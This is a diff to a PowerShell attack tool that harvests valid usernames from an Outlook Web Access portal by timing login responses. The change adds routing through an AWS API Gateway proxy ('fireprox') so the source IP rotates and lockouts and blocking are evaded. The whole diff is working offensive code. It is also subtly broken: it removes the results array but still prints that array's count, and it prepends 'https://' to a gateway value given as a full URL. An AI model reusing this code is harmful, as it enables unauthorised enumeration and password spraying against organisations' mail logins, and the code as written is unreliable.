@@ -3277,11 +3277,15 @@ function Invoke-UsernameHarvestOWA {
     .PARAMETER Threads
 
         Number of password spraying threads to run.
+    
+    .PARAMETER ApiGateway
+    
+        AWS API Gateway to rotate IP Addresses.
 
 
   .EXAMPLE
 
-    C:\PS> Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
+    C:\PS> Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt -ApiGateway https://abcdabcd.execute-api.us-east-1.amazonaws.com/fireprox
 
     Description
     -----------
@@ -3315,13 +3319,20 @@ function Invoke-UsernameHarvestOWA {
     [string]
     $Threads = "1"
 
+    # For the time being, this attribute must be set. If you don't want to use, set it to the same value as $ExchHostname
+    [Parameter(Position = 5, Mandatory = $True)]
+    [string]
+    $ApiGateway = ""
+
   )
 
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
     #Setting up URL's for later
-    $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
-    $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
-
+    $OWAURL = ("https://" + $ApiGateway + "/owa/auth.owa")
+    $OWAURL2 = ("https://" + $ApiGateway + "/owa/")
+    #This gets passed in a post parameter, so must not contain the apigateway
+    $OWAURL3 = ("https://" + $ExchHostname + "/owa/")
+   
     $Usernames = @()
     $Usernames += @(Get-Content $UserList)
     $Users = @()
@@ -3373,11 +3384,9 @@ function Invoke-UsernameHarvestOWA {
 
     $Users += $Usernames
 
-    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2 -Domain $Domain
+    $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL3 -Domain $Domain
     $Thresh = $AvgTime * 0.6
     Write-Host "Threshold: $Thresh"
-
-    $fullresults = @()
 
     ## end code from http://poshcode.org/624
 	Write-Host "Response Time (MS) `t Domain\Username"
@@ -3388,7 +3397,7 @@ function Invoke-UsernameHarvestOWA {
         #Logging into Outlook Web Access
         #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
-        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$CurrUser";password="$Password";isUtf8='1'}
+        $POSTparams = @{destination="$OWAURL3";flags='4';forcedownlevel='0';username="$CurrUser";password="$Password";isUtf8='1'}
 
         $Timer = [system.diagnostics.stopwatch]::startNew()
         $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue
@@ -3398,16 +3407,15 @@ function Invoke-UsernameHarvestOWA {
 		if ($TimeTaken -le $Thresh)
         {
             Write-Host -ForegroundColor "yellow" "[*] Potentially Valid! User:$CurrUser"
-            $fullresults += $CurrUser
+            if ($OutFile -ne "")
+            {
+                $CurrUser | Out-File -Append $OutFile
+            }
+            
         }
     }
 
     Write-Host -ForegroundColor "yellow" ("[*] A total of " + $fullresults.count + " potentially valid usernames found.")
-    if ($OutFile -ne "")
-       {
-            $fullresults | Out-File -Encoding ascii $OutFile
-            Write-Host "Results have been written to $OutFile."
-       }
 }
 
 
